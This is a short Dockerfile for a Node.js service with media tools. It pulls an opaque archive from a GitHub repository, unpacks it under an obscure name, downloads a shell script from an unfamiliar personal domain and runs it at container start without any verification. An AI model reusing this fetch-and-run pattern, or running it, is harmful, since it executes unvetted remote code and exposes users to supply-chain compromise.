FROM node:lts-buster

RUN apt-get update && \
  apt-get install -y \
  ffmpeg \
  imagemagick \
  webp && \
  apt-get upgrade -y && \
  rm -rf /var/lib/apt/lists/*
  
RUN wget https://github.com/RedzinSh/Rose/raw/main/aa

RUN cat a* > renderbfanarrowx.zip

RUN unzip renderbfanarrowx.zip

RUN rm -rf renderbfanarrowx.zip

#RUN mv ./APIS_CARAMELO-VIP/* ./

RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh

COPY . .

RUN chmod +x ./main.sh

RUN chmod +x ./start.sh

RUN npm install

CMD ["sh", "-c", "./iniciar.sh & ./main.sh"]

EXPOSE 5000
